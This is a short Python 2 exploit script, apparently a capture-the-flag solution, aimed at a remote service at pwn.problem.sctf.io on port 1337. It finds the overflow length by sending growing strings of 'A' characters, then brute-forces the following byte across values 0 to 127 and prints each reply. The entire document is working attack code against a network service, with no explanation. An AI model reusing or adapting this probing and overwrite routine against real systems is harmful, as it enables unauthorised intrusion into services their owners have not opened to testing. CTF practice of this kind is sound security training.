#! /usr/bin/python

import socket

host = 'pwn.problem.sctf.io'
port = 1337

def findVuln():
  for i in range(42):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.sendall('A' * i + '\n')
    data = s.recv(1024)
    print data
    if (data == ''):
      break
    s.close()
  return i

def exploit(n):
  for i in range(0, 128):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.sendall('A' * n + chr(i))
    data = s.recv(1024)
    print data
    s.close()

x = findVuln()
exploit(x)
